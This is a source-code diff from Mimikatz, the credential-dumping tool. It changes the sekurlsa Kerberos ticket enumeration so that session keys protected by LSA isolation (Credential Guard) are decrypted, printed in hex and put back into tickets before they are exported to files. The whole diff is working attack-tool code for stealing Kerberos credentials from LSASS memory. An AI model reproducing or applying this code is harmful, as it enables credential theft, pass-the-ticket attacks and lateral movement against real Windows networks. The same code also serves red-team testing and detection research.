@@ -612,6 +612,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 	KULL_M_MEMORY_ADDRESS data = {&pStruct, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aTicket = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassBuffer = {tickets, pData->cLsass->hLsassMem};
 	DWORD nbTickets = 0;
 	PKIWI_KERBEROS_TICKET pKiwiTicket;
+	KIWI_KERBEROS_BUFFER lsaIsoKey;
 	PBERVAL BerApp_KrbCred;
 	BOOL isNormalSessionKey;
 	wchar_t * filename;
@@ -632,6 +633,24 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 					{
 						isNormalSessionKey = (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1507) || (pKiwiTicket->Key.Length < (ULONG) FIELD_OFFSET(LSAISO_DATA_BLOB, data));
 						kuhl_m_kerberos_ticket_display(pKiwiTicket, isNormalSessionKey, FALSE);
+
+						if(!isNormalSessionKey)
+						{
+							kprintf(L"\n\t   LSA Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
+							if(pKiwiTicket->Key.Length <= (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("KerberosKey") - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
+							{
+								if(kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) pKiwiTicket->Key.Value, &lsaIsoKey.Value, &lsaIsoKey.Length))
+								{
+									kprintf(L"\n\t     * Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
+									kprintf(L"\n\t         ");
+									kull_m_string_wprintf_hex(lsaIsoKey.Value, lsaIsoKey.Length, 0);
+									kuhl_m_kerberos_ticket_freeKiwiKerberosBuffer(&pKiwiTicket->Key);
+									pKiwiTicket->Key = lsaIsoKey;
+								}
+							}
+							else kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) pKiwiTicket->Key.Value, pKiwiTicket->Key.Length);
+						}
+
 						if(isFile)
 							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, MIMIKATZ_KERBEROS_EXT))
 							{
@@ -644,16 +663,6 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 								}
 								LocalFree(filename);
 							}
-
-						if(!isNormalSessionKey)
-						{
-							kprintf(L"\n\t   LSA Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
-
-							if(pKiwiTicket->Key.Length <= (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("KerberosKey") - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
-								kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) pKiwiTicket->Key.Value);
-							else
-								kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) pKiwiTicket->Key.Value, pKiwiTicket->Key.Length);
-						}
 
 						kuhl_m_kerberos_ticket_freeTicket(pKiwiTicket);
 					}
